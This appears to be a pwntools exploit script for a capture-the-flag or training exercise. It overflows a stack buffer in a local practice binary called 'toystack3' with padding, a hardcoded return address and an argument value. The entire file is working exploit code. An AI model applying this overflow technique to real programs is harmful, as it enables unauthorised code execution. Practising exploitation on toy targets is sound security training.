from pwn import *

### case 1. when debugging, uncomment and fill in the following:
# Create an instance of the process to talk to
#io = gdb.debug(<PLEASE FILL IN>)
# Attach a debugger to the process so that we can step through
#pause()

### case 2. when exploiting, uncomment and fill in the following:
io = process(b'./toystack3')

# Wait for welcome message output to complete
io.recvuntil('We will now read in some bytes!\n\n\n')

# Overflow the buffer with some padding and a return address
exploit = b'A' * 0x448 + p32(0x565559ff) + b'B' * 4 + p32(0x1337)

# Send our payload to standard input
io.send(exploit)

# Print out the program response
print(io.recv())